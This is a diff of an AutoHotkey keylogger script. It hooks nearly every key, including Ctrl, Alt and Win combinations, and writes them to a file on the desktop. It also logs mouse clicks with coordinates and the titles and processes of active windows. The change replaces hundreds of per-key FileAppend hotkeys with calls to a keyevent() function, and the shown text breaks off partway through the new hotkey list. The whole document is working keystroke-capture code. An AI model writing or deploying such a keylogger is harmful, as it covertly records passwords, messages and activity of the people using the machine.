@@ -4,11 +4,12 @@
 
 #NoEnv ; Recommended for performance and compatibility with future AutoHotkey releases.
 log = %A_Desktop%\keylogger.txt
+doublequote = `"
 
 keyevent(key) {
-    global
-    FileAppend, %key%, *%log%
-    previousnewline = 0
+    global log
+    FileAppend, %key%`n, *%log%
+    ;previousnewline = 0
 }
 
 mouseevent(message) {
@@ -17,10 +18,7 @@ mouseevent(message) {
     WinGet, ProcessName, ProcessName, A
     MouseGetPos, x, y, window, controln
 
-    ;if (%previousnewline% == 0)
-        FileAppend, `n, *%log%
     FileAppend, {%message%} %x% %y% %ProcessName%: %Title%: %controln%`n, *%log%
-    previousnewline = 1
 }
 
 getwin() {
@@ -29,10 +27,7 @@ getwin() {
     WinGet, ProcessName, ProcessName, A
     FormatTime, time, , yyyy-MM-dd-HH:mm:ss
 
-    ;if (%previousnewline% == 0)
-        FileAppend, `n, *%log%
     FileAppend, %time% %ProcessName%: %Title%`n, *%log%
-    previousnewline = 1
 }
 
 getwin()
@@ -42,663 +37,663 @@ Loop {
     getwin()
 }
 
-~a::FileAppend, a, *%log%
-~#a::FileAppend, a, *%log%
-~!a::FileAppend, a, *%log%
-~^a::FileAppend, a, *%log%
-~b::FileAppend, b, *%log%
-~#b::FileAppend, b, *%log%
-~!b::FileAppend, b, *%log%
-~^b::FileAppend, b, *%log%
-~c::FileAppend, c, *%log%
-~#c::FileAppend, c, *%log%
-~!c::FileAppend, c, *%log%
-~^c::FileAppend, c, *%log%
-~d::FileAppend, d, *%log%
-~#d::FileAppend, d, *%log%
-~!d::FileAppend, d, *%log%
-~^d::FileAppend, d, *%log%
-~e::FileAppend, e, *%log%
-~#e::FileAppend, e, *%log%
-~!e::FileAppend, e, *%log%
-~^e::FileAppend, e, *%log%
-~f::FileAppend, f, *%log%
-~#f::FileAppend, f, *%log%
-~!f::FileAppend, f, *%log%
-~^f::FileAppend, f, *%log%
-~g::FileAppend, g, *%log%
-~#g::FileAppend, g, *%log%
-~!g::FileAppend, g, *%log%
-~^g::FileAppend, g, *%log%
-~h::FileAppend, h, *%log%
-~#h::FileAppend, h, *%log%
-~!h::FileAppend, h, *%log%
-~^h::FileAppend, h, *%log%
-~i::FileAppend, i, *%log%
-~#i::FileAppend, i, *%log%
-~!i::FileAppend, i, *%log%
-~^i::FileAppend, i, *%log%
-~j::FileAppend, j, *%log%
-~#j::FileAppend, j, *%log%
-~!j::FileAppend, j, *%log%
-~^j::FileAppend, j, *%log%
-~k::FileAppend, k, *%log%
-~#k::FileAppend, k, *%log%
-~!k::FileAppend, k, *%log%
-~^k::FileAppend, k, *%log%
-~l::FileAppend, l, *%log%
-~#l::FileAppend, l, *%log%
-~!l::FileAppend, l, *%log%
-~^l::FileAppend, l, *%log%
-~m::FileAppend, m, *%log%
-~#m::FileAppend, m, *%log%
-~!m::FileAppend, m, *%log%
-~^m::FileAppend, m, *%log%
-~n::FileAppend, n, *%log%
-~#n::FileAppend, n, *%log%
-~!n::FileAppend, n, *%log%
-~^n::FileAppend, n, *%log%
-~o::FileAppend, o, *%log%
-~#o::FileAppend, o, *%log%
-~!o::FileAppend, o, *%log%
-~^o::FileAppend, o, *%log%
-~p::FileAppend, p, *%log%
-~#p::FileAppend, p, *%log%
-~!p::FileAppend, p, *%log%
-~^p::FileAppend, p, *%log%
-~q::FileAppend, q, *%log%
-~#q::FileAppend, q, *%log%
-~!q::FileAppend, q, *%log%
-~^q::FileAppend, q, *%log%
-~r::FileAppend, r, *%log%
-~#r::FileAppend, r, *%log%
-~!r::FileAppend, r, *%log%
-~^r::FileAppend, r, *%log%
-~s::FileAppend, s, *%log%
-~#s::FileAppend, s, *%log%
-~!s::FileAppend, s, *%log%
-~^s::FileAppend, s, *%log%
-~t::FileAppend, t, *%log%
-~#t::FileAppend, t, *%log%
-~!t::FileAppend, t, *%log%
-~^t::FileAppend, t, *%log%
-~u::FileAppend, u, *%log%
-~#u::FileAppend, u, *%log%
-~!u::FileAppend, u, *%log%
-~^u::FileAppend, u, *%log%
-~v::FileAppend, v, *%log%
-~#v::FileAppend, v, *%log%
-~!v::FileAppend, v, *%log%
-~^v::FileAppend, v, *%log%
-~w::FileAppend, w, *%log%
-~#w::FileAppend, w, *%log%
-~!w::FileAppend, w, *%log%
-~^w::FileAppend, w, *%log%
-~x::FileAppend, x, *%log%
-~#x::FileAppend, x, *%log%
-~!x::FileAppend, x, *%log%
-~^x::FileAppend, x, *%log%
-~y::FileAppend, y, *%log%
-~#y::FileAppend, y, *%log%
-~!y::FileAppend, y, *%log%
-~^y::FileAppend, y, *%log%
-~z::FileAppend, z, *%log%
-~#z::FileAppend, z, *%log%
-~!z::FileAppend, z, *%log%
-~^z::FileAppend, z, *%log%
-~+A::FileAppend, A, *%log%
-~#+A::FileAppend, A, *%log%
-~!+A::FileAppend, A, *%log%
-~^+A::FileAppend, A, *%log%
-~+B::FileAppend, B, *%log%
-~#+B::FileAppend, B, *%log%
-~!+B::FileAppend, B, *%log%
-~^+B::FileAppend, B, *%log%
-~+C::FileAppend, C, *%log%
-~#+C::FileAppend, C, *%log%
-~!+C::FileAppend, C, *%log%
-~^+C::FileAppend, C, *%log%
-~+D::FileAppend, D, *%log%
-~#+D::FileAppend, D, *%log%
-~!+D::FileAppend, D, *%log%
-~^+D::FileAppend, D, *%log%
-~+E::FileAppend, E, *%log%
-~#+E::FileAppend, E, *%log%
-~!+E::FileAppend, E, *%log%
-~^+E::FileAppend, E, *%log%
-~+F::FileAppend, F, *%log%
-~#+F::FileAppend, F, *%log%
-~!+F::FileAppend, F, *%log%
-~^+F::FileAppend, F, *%log%
-~+G::FileAppend, G, *%log%
-~#+G::FileAppend, G, *%log%
-~!+G::FileAppend, G, *%log%
-~^+G::FileAppend, G, *%log%
-~+H::FileAppend, H, *%log%
-~#+H::FileAppend, H, *%log%
-~!+H::FileAppend, H, *%log%
-~^+H::FileAppend, H, *%log%
-~+I::FileAppend, I, *%log%
-~#+I::FileAppend, I, *%log%
-~!+I::FileAppend, I, *%log%
-~^+I::FileAppend, I, *%log%
-~+J::FileAppend, J, *%log%
-~#+J::FileAppend, J, *%log%
-~!+J::FileAppend, J, *%log%
-~^+J::FileAppend, J, *%log%
-~+K::FileAppend, K, *%log%
-~#+K::FileAppend, K, *%log%
-~!+K::FileAppend, K, *%log%
-~^+K::FileAppend, K, *%log%
-~+L::FileAppend, L, *%log%
-~#+L::FileAppend, L, *%log%
-~!+L::FileAppend, L, *%log%
-~^+L::FileAppend, L, *%log%
-~+M::FileAppend, M, *%log%
-~#+M::FileAppend, M, *%log%
-~!+M::FileAppend, M, *%log%
-~^+M::FileAppend, M, *%log%
-~+N::FileAppend, N, *%log%
-~#+N::FileAppend, N, *%log%
-~!+N::FileAppend, N, *%log%
-~^+N::FileAppend, N, *%log%
-~+O::FileAppend, O, *%log%
-~#+O::FileAppend, O, *%log%
-~!+O::FileAppend, O, *%log%
-~^+O::FileAppend, O, *%log%
-~+P::FileAppend, P, *%log%
-~#+P::FileAppend, P, *%log%
-~!+P::FileAppend, P, *%log%
-~^+P::FileAppend, P, *%log%
-~+Q::FileAppend, Q, *%log%
-~#+Q::FileAppend, Q, *%log%
-~!+Q::FileAppend, Q, *%log%
-~^+Q::FileAppend, Q, *%log%
-~+R::FileAppend, R, *%log%
-~#+R::FileAppend, R, *%log%
-~!+R::FileAppend, R, *%log%
-~^+R::FileAppend, R, *%log%
-~+S::FileAppend, S, *%log%
-~#+S::FileAppend, S, *%log%
-~!+S::FileAppend, S, *%log%
-~^+S::FileAppend, S, *%log%
-~+T::FileAppend, T, *%log%
-~#+T::FileAppend, T, *%log%
-~!+T::FileAppend, T, *%log%
-~^+T::FileAppend, T, *%log%
-~+U::FileAppend, U, *%log%
-~#+U::FileAppend, U, *%log%
-~!+U::FileAppend, U, *%log%
-~^+U::FileAppend, U, *%log%
-~+V::FileAppend, V, *%log%
-~#+V::FileAppend, V, *%log%
-~!+V::FileAppend, V, *%log%
-~^+V::FileAppend, V, *%log%
-~+W::FileAppend, W, *%log%
-~#+W::FileAppend, W, *%log%
-~!+W::FileAppend, W, *%log%
-~^+W::FileAppend, W, *%log%
-~+X::FileAppend, X, *%log%
-~#+X::FileAppend, X, *%log%
-~!+X::FileAppend, X, *%log%
-~^+X::FileAppend, X, *%log%
-~+Y::FileAppend, Y, *%log%
-~#+Y::FileAppend, Y, *%log%
-~!+Y::FileAppend, Y, *%log%
-~^+Y::FileAppend, Y, *%log%
-~+Z::FileAppend, Z, *%log%
-~#+Z::FileAppend, Z, *%log%
-~!+Z::FileAppend, Z, *%log%
-~^+Z::FileAppend, Z, *%log%
-~`::FileAppend, ``, *%log%
-~#`::FileAppend, ``, *%log%
-~!`::FileAppend, ``, *%log%
-~^`::FileAppend, ``, *%log%
-~!::FileAppend, !, *%log%
-~#!::FileAppend, !, *%log%
-~!!::FileAppend, !, *%log%
-~^!::FileAppend, !, *%log%
-~@::FileAppend, @, *%log%
-~#@::FileAppend, @, *%log%
-~!@::FileAppend, @, *%log%
-~^@::FileAppend, @, *%log%
-~#::FileAppend, #, *%log%
-~##::FileAppend, #, *%log%
-~!#::FileAppend, #, *%log%
-~^#::FileAppend, #, *%log%
-~$::FileAppend, $, *%log%
-~#$::FileAppend, $, *%log%
-~!$::FileAppend, $, *%log%
-~^$::FileAppend, $, *%log%
-~^::FileAppend, ^, *%log%
-~#^::FileAppend, ^, *%log%
-~!^::FileAppend, ^, *%log%
-~^^::FileAppend, ^, *%log%
-~&::FileAppend, &, *%log%
-~#&::FileAppend, &, *%log%
-~!&::FileAppend, &, *%log%
-~^&::FileAppend, &, *%log%
-~*::FileAppend, *, *%log%
-~#*::FileAppend, *, *%log%
-~!*::FileAppend, *, *%log%
-~^*::FileAppend, *, *%log%
-~(::FileAppend, (, *%log%
-~#(::FileAppend, (, *%log%
-~!(::FileAppend, (, *%log%
-~^(::FileAppend, (, *%log%
-~)::FileAppend, ), *%log%
-~#)::FileAppend, ), *%log%
-~!)::FileAppend, ), *%log%
-~^)::FileAppend, ), *%log%
-~-::FileAppend, -, *%log%
-~#-::FileAppend, -, *%log%
-~!-::FileAppend, -, *%log%
-~^-::FileAppend, -, *%log%
-~_::FileAppend, _, *%log%
-~#_::FileAppend, _, *%log%
-~!_::FileAppend, _, *%log%
-~^_::FileAppend, _, *%log%
-~=::FileAppend, =, *%log%
-~#=::FileAppend, =, *%log%
-~!=::FileAppend, =, *%log%
-~^=::FileAppend, =, *%log%
-~+::FileAppend, +, *%log%
-~#+::FileAppend, +, *%log%
-~!+::FileAppend, +, *%log%
-~^+::FileAppend, +, *%log%
-~[::FileAppend, [, *%log%
-~#[::FileAppend, [, *%log%
-~![::FileAppend, [, *%log%
-~^[::FileAppend, [, *%log%
-~{::FileAppend, {, *%log%
-~#{::FileAppend, {, *%log%
-~!{::FileAppend, {, *%log%
-~^{::FileAppend, {, *%log%
-~]::FileAppend, ], *%log%
-~#]::FileAppend, ], *%log%
-~!]::FileAppend, ], *%log%
-~^]::FileAppend, ], *%log%
-~}::FileAppend, }, *%log%
-~#}::FileAppend, }, *%log%
-~!}::FileAppend, }, *%log%
-~^}::FileAppend, }, *%log%
-~\::FileAppend, \, *%log%
-~#\::FileAppend, \, *%log%
-~!\::FileAppend, \, *%log%
-~^\::FileAppend, \, *%log%
-~|::FileAppend, |, *%log%
-~#|::FileAppend, |, *%log%
-~!|::FileAppend, |, *%log%
-~^|::FileAppend, |, *%log%
-~+;::FileAppend, :, *%log%
-~#+;::FileAppend, :, *%log%
-~!+;::FileAppend, :, *%log%
-~^+;::FileAppend, :, *%log%
-~;::FileAppend, `;, *%log%
-~#;::FileAppend, `;, *%log%
-~!;::FileAppend, `;, *%log%
-~^;::FileAppend, `;, *%log%
-~SC028::FileAppend, ', *%log%
-~#SC028::FileAppend, ', *%log%
-~!SC028::FileAppend, ', *%log%
-~^SC028::FileAppend, ', *%log%
-~+SC028::FileAppend, ", *%log%
-~#+SC028::FileAppend, ", *%log%
-~!+SC028::FileAppend, ", *%log%
-~^+SC028::FileAppend, ", *%log%
-~,::FileAppend, {comma}, *%log%
-~#,::FileAppend, {comma}, *%log%
-~!,::FileAppend, {comma}, *%log%
-~^,::FileAppend, {comma}, *%log%
-~.::FileAppend, ., *%log%
-~#.::FileAppend, ., *%log%
-~!.::FileAppend, ., *%log%
-~^.::FileAppend, ., *%log%
-~<::FileAppend, <, *%log%
-~#<::FileAppend, <, *%log%
-~!<::FileAppend, <, *%log%
-~^<::FileAppend, <, *%log%
-~>::FileAppend, >, *%log%
-~#>::FileAppend, >, *%log%
-~!>::FileAppend, >, *%log%
-~^>::FileAppend, >, *%log%
-~/::FileAppend, /, *%log%
-~#/::FileAppend, /, *%log%
-~!/::FileAppend, /, *%log%
-~^/::FileAppend, /, *%log%
-~?::FileAppend, ?, *%log%
-~#?::FileAppend, ?, *%log%
-~!?::FileAppend, ?, *%log%
-~^?::FileAppend, ?, *%log%
-~1::FileAppend, 1, *%log%
-~#1::FileAppend, 1, *%log%
-~!1::FileAppend, 1, *%log%
-~^1::FileAppend, 1, *%log%
-~2::FileAppend, 2, *%log%
-~#2::FileAppend, 2, *%log%
-~!2::FileAppend, 2, *%log%
-~^2::FileAppend, 2, *%log%
-~3::FileAppend, 3, *%log%
-~#3::FileAppend, 3, *%log%
-~!3::FileAppend, 3, *%log%
-~^3::FileAppend, 3, *%log%
-~4::FileAppend, 4, *%log%
-~#4::FileAppend, 4, *%log%
-~!4::FileAppend, 4, *%log%
-~^4::FileAppend, 4, *%log%
-~5::FileAppend, 5, *%log%
-~#5::FileAppend, 5, *%log%
-~!5::FileAppend, 5, *%log%
-~^5::FileAppend, 5, *%log%
-~6::FileAppend, 6, *%log%
-~#6::FileAppend, 6, *%log%
-~!6::FileAppend, 6, *%log%
-~^6::FileAppend, 6, *%log%
-~7::FileAppend, 7, *%log%
-~#7::FileAppend, 7, *%log%
-~!7::FileAppend, 7, *%log%
-~^7::FileAppend, 7, *%log%
-~8::FileAppend, 8, *%log%
-~#8::FileAppend, 8, *%log%
-~!8::FileAppend, 8, *%log%
-~^8::FileAppend, 8, *%log%
-~9::FileAppend, 9, *%log%
-~#9::FileAppend, 9, *%log%
-~!9::FileAppend, 9, *%log%
-~^9::FileAppend, 9, *%log%
-~0::FileAppend, 0, *%log%
-~#0::FileAppend, 0, *%log%
-~!0::FileAppend, 0, *%log%
-~^0::FileAppend, 0, *%log%
-~Space::FileAppend, %A_Space%, *%log%
-~#Space::FileAppend, %A_Space%, *%log%
-~!Space::FileAppend, %A_Space%, *%log%
-~^Space::FileAppend, %A_Space%, *%log%
-~Tab::FileAppend, {Tab}, *%log%
-~#Tab::FileAppend, {Tab}, *%log%
-~!Tab::FileAppend, {Tab}, *%log%
-~^Tab::FileAppend, {Tab}, *%log%
-~Enter::FileAppend, {Enter}`n, *%log%
-~#Enter::FileAppend, {Enter}`n, *%log%
-~!Enter::FileAppend, {Enter}`n, *%log%
-~^Enter::FileAppend, {Enter}`n, *%log%
-~Esc::FileAppend, {Esc}, *%log%
-~#Esc::FileAppend, {Esc}, *%log%
-~!Esc::FileAppend, {Esc}, *%log%
-~^Esc::FileAppend, {Esc}, *%log%
-~SC00E::FileAppend, {BS}, *%log%
-~#SC00E::FileAppend, {BS}, *%log%
-~!SC00E::FileAppend, {BS}, *%log%
-~^SC00E::FileAppend, {BS}, *%log%
-~Pause::FileAppend, {Pause}, *%log%
-~#Pause::FileAppend, {Pause}, *%log%
-~!Pause::FileAppend, {Pause}, *%log%
-~^Pause::FileAppend, {Pause}, *%log%
-~ScrollLock::FileAppend, {ScrollLock}, *%log%
-~#ScrollLock::FileAppend, {ScrollLock}, *%log%
-~!ScrollLock::FileAppend, {ScrollLock}, *%log%
-~^ScrollLock::FileAppend, {ScrollLock}, *%log%
-~Delete::FileAppend, {Delete}, *%log%
-~#Delete::FileAppend, {Delete}, *%log%
-~!Delete::FileAppend, {Delete}, *%log%
-~^Delete::FileAppend, {Delete}, *%log%
-~Insert::FileAppend, {Insert}, *%log%
-~#Insert::FileAppend, {Insert}, *%log%
-~!Insert::FileAppend, {Insert}, *%log%
-~^Insert::FileAppend, {Insert}, *%log%
-~Home::FileAppend, {Home}, *%log%
-~#Home::FileAppend, {Home}, *%log%
-~!Home::FileAppend, {Home}, *%log%
-~^Home::FileAppend, {Home}, *%log%
-~End::FileAppend, {End}, *%log%
-~#End::FileAppend, {End}, *%log%
-~!End::FileAppend, {End}, *%log%
-~^End::FileAppend, {End}, *%log%
-~PgUp::FileAppend, {PgUp}, *%log%
-~#PgUp::FileAppend, {PgUp}, *%log%
-~!PgUp::FileAppend, {PgUp}, *%log%
-~^PgUp::FileAppend, {PgUp}, *%log%
-~PgDn::FileAppend, {PgDn}, *%log%
-~#PgDn::FileAppend, {PgDn}, *%log%
-~!PgDn::FileAppend, {PgDn}, *%log%
-~^PgDn::FileAppend, {PgDn}, *%log%
-~Up::FileAppend, {Up}, *%log%
-~#Up::FileAppend, {Up}, *%log%
-~!Up::FileAppend, {Up}, *%log%
-~^Up::FileAppend, {Up}, *%log%
-~Down::FileAppend, {Down}, *%log%
-~#Down::FileAppend, {Down}, *%log%
-~!Down::FileAppend, {Down}, *%log%
-~^Down::FileAppend, {Down}, *%log%
-~Left::FileAppend, {Left}, *%log%
-~#Left::FileAppend, {Left}, *%log%
-~!Left::FileAppend, {Left}, *%log%
-~^Left::FileAppend, {Left}, *%log%
-~Right::FileAppend, {Right}, *%log%
-~#Right::FileAppend, {Right}, *%log%
-~!Right::FileAppend, {Right}, *%log%
-~^Right::FileAppend, {Right}, *%log%
-~CapsLock::FileAppend, {CapsLock}, *%log%
-~#CapsLock::FileAppend, {CapsLock}, *%log%
-~!CapsLock::FileAppend, {CapsLock}, *%log%
-~^CapsLock::FileAppend, {CapsLock}, *%log%
-~NumLock::FileAppend, {NumLock}, *%log%
-~#NumLock::FileAppend, {NumLock}, *%log%
-~!NumLock::FileAppend, {NumLock}, *%log%
-~^NumLock::FileAppend, {NumLock}, *%log%
-~Numpad0::FileAppend, {Numpad0}, *%log%
-~#Numpad0::FileAppend, {Numpad0}, *%log%
-~!Numpad0::FileAppend, {Numpad0}, *%log%
-~^Numpad0::FileAppend, {Numpad0}, *%log%
-~Numpad1::FileAppend, {Numpad1}, *%log%
-~#Numpad1::FileAppend, {Numpad1}, *%log%
-~!Numpad1::FileAppend, {Numpad1}, *%log%
-~^Numpad1::FileAppend, {Numpad1}, *%log%
-~Numpad2::FileAppend, {Numpad2}, *%log%
-~#Numpad2::FileAppend, {Numpad2}, *%log%
-~!Numpad2::FileAppend, {Numpad2}, *%log%
-~^Numpad2::FileAppend, {Numpad2}, *%log%
-~Numpad3::FileAppend, {Numpad3}, *%log%
-~#Numpad3::FileAppend, {Numpad3}, *%log%
-~!Numpad3::FileAppend, {Numpad3}, *%log%
-~^Numpad3::FileAppend, {Numpad3}, *%log%
-~Numpad4::FileAppend, {Numpad4}, *%log%
-~#Numpad4::FileAppend, {Numpad4}, *%log%
-~!Numpad4::FileAppend, {Numpad4}, *%log%
-~^Numpad4::FileAppend, {Numpad4}, *%log%
-~Numpad5::FileAppend, {Numpad5}, *%log%
-~#Numpad5::FileAppend, {Numpad5}, *%log%
-~!Numpad5::FileAppend, {Numpad5}, *%log%
-~^Numpad5::FileAppend, {Numpad5}, *%log%
-~Numpad6::FileAppend, {Numpad6}, *%log%
-~#Numpad6::FileAppend, {Numpad6}, *%log%
-~!Numpad6::FileAppend, {Numpad6}, *%log%
-~^Numpad6::FileAppend, {Numpad6}, *%log%
-~Numpad7::FileAppend, {Numpad7}, *%log%
-~#Numpad7::FileAppend, {Numpad7}, *%log%
-~!Numpad7::FileAppend, {Numpad7}, *%log%
-~^Numpad7::FileAppend, {Numpad7}, *%log%
-~Numpad8::FileAppend, {Numpad8}, *%log%
-~#Numpad8::FileAppend, {Numpad8}, *%log%
-~!Numpad8::FileAppend, {Numpad8}, *%log%
-~^Numpad8::FileAppend, {Numpad8}, *%log%
-~Numpad9::FileAppend, {Numpad9}, *%log%
-~#Numpad9::FileAppend, {Numpad9}, *%log%
-~!Numpad9::FileAppend, {Numpad9}, *%log%
-~^Numpad9::FileAppend, {Numpad9}, *%log%
-~NumpadAdd::FileAppend, {NumpadAdd}, *%log%
-~#NumpadAdd::FileAppend, {NumpadAdd}, *%log%
-~!NumpadAdd::FileAppend, {NumpadAdd}, *%log%
-~^NumpadAdd::FileAppend, {NumpadAdd}, *%log%
-~NumpadClear::FileAppend, {NumpadClear}, *%log%
-~#NumpadClear::FileAppend, {NumpadClear}, *%log%
-~!NumpadClear::FileAppend, {NumpadClear}, *%log%
-~^NumpadClear::FileAppend, {NumpadClear}, *%log%
-~NumpadDel::FileAppend, {NumpadDel}, *%log%
-~#NumpadDel::FileAppend, {NumpadDel}, *%log%
-~!NumpadDel::FileAppend, {NumpadDel}, *%log%
-~^NumpadDel::FileAppend, {NumpadDel}, *%log%
-~NumpadDiv::FileAppend, {NumpadDiv}, *%log%
-~#NumpadDiv::FileAppend, {NumpadDiv}, *%log%
-~!NumpadDiv::FileAppend, {NumpadDiv}, *%log%
-~^NumpadDiv::FileAppend, {NumpadDiv}, *%log%
-~NumpadDot::FileAppend, {NumpadDot}, *%log%
-~#NumpadDot::FileAppend, {NumpadDot}, *%log%
-~!NumpadDot::FileAppend, {NumpadDot}, *%log%
-~^NumpadDot::FileAppend, {NumpadDot}, *%log%
-~NumpadDown::FileAppend, {NumpadDown}, *%log%
-~#NumpadDown::FileAppend, {NumpadDown}, *%log%
-~!NumpadDown::FileAppend, {NumpadDown}, *%log%
-~^NumpadDown::FileAppend, {NumpadDown}, *%log%
-~NumpadEnd::FileAppend, {NumpadEnd}, *%log%
-~#NumpadEnd::FileAppend, {NumpadEnd}, *%log%
-~!NumpadEnd::FileAppend, {NumpadEnd}, *%log%
-~^NumpadEnd::FileAppend, {NumpadEnd}, *%log%
-~NumpadEnter::FileAppend, {NumpadEnter}, *%log%
-~#NumpadEnter::FileAppend, {NumpadEnter}, *%log%
-~!NumpadEnter::FileAppend, {NumpadEnter}, *%log%
-~^NumpadEnter::FileAppend, {NumpadEnter}, *%log%
-~NumpadHome::FileAppend, {NumpadHome}, *%log%
-~#NumpadHome::FileAppend, {NumpadHome}, *%log%
-~!NumpadHome::FileAppend, {NumpadHome}, *%log%
-~^NumpadHome::FileAppend, {NumpadHome}, *%log%
-~NumpadIns::FileAppend, {NumpadIns}, *%log%
-~#NumpadIns::FileAppend, {NumpadIns}, *%log%
-~!NumpadIns::FileAppend, {NumpadIns}, *%log%
-~^NumpadIns::FileAppend, {NumpadIns}, *%log%
-~NumpadLeft::FileAppend, {NumpadLeft}, *%log%
-~#NumpadLeft::FileAppend, {NumpadLeft}, *%log%
-~!NumpadLeft::FileAppend, {NumpadLeft}, *%log%
-~^NumpadLeft::FileAppend, {NumpadLeft}, *%log%
-~NumpadMult::FileAppend, {NumpadMult}, *%log%
-~#NumpadMult::FileAppend, {NumpadMult}, *%log%
-~!NumpadMult::FileAppend, {NumpadMult}, *%log%
-~^NumpadMult::FileAppend, {NumpadMult}, *%log%
-~NumpadPgDn::FileAppend, {NumpadPgDn}, *%log%
-~#NumpadPgDn::FileAppend, {NumpadPgDn}, *%log%
-~!NumpadPgDn::FileAppend, {NumpadPgDn}, *%log%
-~^NumpadPgDn::FileAppend, {NumpadPgDn}, *%log%
-~NumpadPgUp::FileAppend, {NumpadPgUp}, *%log%
-~#NumpadPgUp::FileAppend, {NumpadPgUp}, *%log%
-~!NumpadPgUp::FileAppend, {NumpadPgUp}, *%log%
-~^NumpadPgUp::FileAppend, {NumpadPgUp}, *%log%
-~NumpadRight::FileAppend, {NumpadRight}, *%log%
-~#NumpadRight::FileAppend, {NumpadRight}, *%log%
-~!NumpadRight::FileAppend, {NumpadRight}, *%log%
-~^NumpadRight::FileAppend, {NumpadRight}, *%log%
-~NumpadSub::FileAppend, {NumpadSub}, *%log%
-~#NumpadSub::FileAppend, {NumpadSub}, *%log%
-~!NumpadSub::FileAppend, {NumpadSub}, *%log%
-~^NumpadSub::FileAppend, {NumpadSub}, *%log%
-~NumpadUp::FileAppend, {NumpadUp}, *%log%
-~#NumpadUp::FileAppend, {NumpadUp}, *%log%
-~!NumpadUp::FileAppend, {NumpadUp}, *%log%
-~^NumpadUp::FileAppend, {NumpadUp}, *%log%
-~F1::FileAppend, {F1}, *%log%
-~#F1::FileAppend, {F1}, *%log%
-~!F1::FileAppend, {F1}, *%log%
-~^F1::FileAppend, {F1}, *%log%
-~F2::FileAppend, {F2}, *%log%
-~#F2::FileAppend, {F2}, *%log%
-~!F2::FileAppend, {F2}, *%log%
-~^F2::FileAppend, {F2}, *%log%
-~F3::FileAppend, {F3}, *%log%
-~#F3::FileAppend, {F3}, *%log%
-~!F3::FileAppend, {F3}, *%log%
-~^F3::FileAppend, {F3}, *%log%
-~F4::FileAppend, {F4}, *%log%
-~#F4::FileAppend, {F4}, *%log%
-~!F4::FileAppend, {F4}, *%log%
-~^F4::FileAppend, {F4}, *%log%
-~F5::FileAppend, {F5}, *%log%
-~#F5::FileAppend, {F5}, *%log%
-~!F5::FileAppend, {F5}, *%log%
-~^F5::FileAppend, {F5}, *%log%
-~F6::FileAppend, {F6}, *%log%
-~#F6::FileAppend, {F6}, *%log%
-~!F6::FileAppend, {F6}, *%log%
-~^F6::FileAppend, {F6}, *%log%
-~F7::FileAppend, {F7}, *%log%
-~#F7::FileAppend, {F7}, *%log%
-~!F7::FileAppend, {F7}, *%log%
-~^F7::FileAppend, {F7}, *%log%
-~F8::FileAppend, {F8}, *%log%
-~#F8::FileAppend, {F8}, *%log%
-~!F8::FileAppend, {F8}, *%log%
-~^F8::FileAppend, {F8}, *%log%
-~F9::FileAppend, {F9}, *%log%
-~#F9::FileAppend, {F9}, *%log%
-~!F9::FileAppend, {F9}, *%log%
-~^F9::FileAppend, {F9}, *%log%
-~F10::FileAppend, {F10}, *%log%
-~#F10::FileAppend, {F10}, *%log%
-~!F10::FileAppend, {F10}, *%log%
-~^F10::FileAppend, {F10}, *%log%
-~F11::FileAppend, {F11}, *%log%
-~#F11::FileAppend, {F11}, *%log%
-~!F11::FileAppend, {F11}, *%log%
-~^F11::FileAppend, {F11}, *%log%
-~F12::FileAppend, {F12}, *%log%
-~#F12::FileAppend, {F12}, *%log%
-~!F12::FileAppend, {F12}, *%log%
-~^F12::FileAppend, {F12}, *%log%
-~F13::FileAppend, {F13}, *%log%
-~#F13::FileAppend, {F13}, *%log%
-~!F13::FileAppend, {F13}, *%log%
-~^F13::FileAppend, {F13}, *%log%
-~F14::FileAppend, {F14}, *%log%
-~#F14::FileAppend, {F14}, *%log%
-~!F14::FileAppend, {F14}, *%log%
-~^F14::FileAppend, {F14}, *%log%
-~F15::FileAppend, {F15}, *%log%
-~#F15::FileAppend, {F15}, *%log%
-~!F15::FileAppend, {F15}, *%log%
-~^F15::FileAppend, {F15}, *%log%
-~F16::FileAppend, {F16}, *%log%
-~#F16::FileAppend, {F16}, *%log%
-~!F16::FileAppend, {F16}, *%log%
-~^F16::FileAppend, {F16}, *%log%
-~F17::FileAppend, {F17}, *%log%
-~#F17::FileAppend, {F17}, *%log%
-~!F17::FileAppend, {F17}, *%log%
-~^F17::FileAppend, {F17}, *%log%
-~F18::FileAppend, {F18}, *%log%
-~#F18::FileAppend, {F18}, *%log%
-~!F18::FileAppend, {F18}, *%log%
-~^F18::FileAppend, {F18}, *%log%
-~F19::FileAppend, {F19}, *%log%
-~#F19::FileAppend, {F19}, *%log%
-~!F19::FileAppend, {F19}, *%log%
-~^F19::FileAppend, {F19}, *%log%
-~F20::FileAppend, {F20}, *%log%
-~#F20::FileAppend, {F20}, *%log%
-~!F20::FileAppend, {F20}, *%log%
-~^F20::FileAppend, {F20}, *%log%
-~F21::FileAppend, {F21}, *%log%
-~#F21::FileAppend, {F21}, *%log%
-~!F21::FileAppend, {F21}, *%log%
-~^F21::FileAppend, {F21}, *%log%
-~F22::FileAppend, {F22}, *%log%
-~#F22::FileAppend, {F22}, *%log%
-~!F22::FileAppend, {F22}, *%log%
-~^F22::FileAppend, {F22}, *%log%
-~F23::FileAppend, {F23}, *%log%
-~#F23::FileAppend, {F23}, *%log%
-~!F23::FileAppend, {F23}, *%log%
-~^F23::FileAppend, {F23}, *%log%
-~F24::FileAppend, {F24}, *%log%
-~#F24::FileAppend, {F24}, *%log%
-~!F24::FileAppend, {F24}, *%log%
-~^F24::FileAppend, {F24}, *%log%
-~AppsKey::FileAppend, {AppsKey}, *%log%
-~#AppsKey::FileAppend, {AppsKey}, *%log%
-~!AppsKey::FileAppend, {AppsKey}, *%log%
-~^AppsKey::FileAppend, {AppsKey}, *%log%
+~a::keyevent("a")
+~#a::keyevent("a")
+~!a::keyevent("a")
+~^a::keyevent("a")
+~b::keyevent("b")
+~#b::keyevent("b")
+~!b::keyevent("b")
+~^b::keyevent("b")
+~c::keyevent("c")
+~#c::keyevent("c")
+~!c::keyevent("c")
+~^c::keyevent("c")
+~d::keyevent("d")
+~#d::keyevent("d")
+~!d::keyevent("d")
+~^d::keyevent("d")
+~e::keyevent("e")
+~#e::keyevent("e")
+~!e::keyevent("e")
+~^e::keyevent("e")
+~f::keyevent("f")
+~#f::keyevent("f")
+~!f::keyevent("f")
+~^f::keyevent("f")
+~g::keyevent("g")
+~#g::keyevent("g")
+~!g::keyevent("g")
+~^g::keyevent("g")
+~h::keyevent("h")
+~#h::keyevent("h")
+~!h::keyevent("h")
+~^h::keyevent("h")
+~i::keyevent("i")
+~#i::keyevent("i")
+~!i::keyevent("i")
+~^i::keyevent("i")
+~j::keyevent("j")
+~#j::keyevent("j")
